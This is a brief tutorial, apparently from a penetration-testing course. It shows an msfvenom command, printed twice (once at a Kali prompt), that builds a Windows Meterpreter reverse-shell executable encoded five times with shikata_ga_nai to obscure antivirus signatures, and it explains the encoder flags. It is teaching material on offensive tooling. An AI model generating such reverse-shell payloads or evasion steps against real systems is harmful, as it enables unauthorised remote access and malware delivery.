msfvenom: Applying Encoders

Using shikata_ga_nai to obscure payload signatures

The Encoded Payload Command

This command applies the x86/shikata_ga_nai encoder with 5 iterations, further scrambling the payload. Note the increase in file size due to the decoder stub.

msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=192.168.1.100 LPORT=4444 \
         -f exe -e x86/shikata_ga_nai -i 5 \
         -o /tmp/encoded_shell.exe
  • •-e: Specifies the encoder (e.g., x86/shikata_ga_nai).
  • •-i: Number of times to iterate the encoding process.
  • •Comparison: Encoded payloads are typically larger due to the embedded decoder stub.
Key Takeaway

While encoders obscure signatures, well-known encoders like shikata_ga_nai are often detected by modern AVs due to signatures for their decoder stubs.

kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o /tmp/encoded_shell.exe
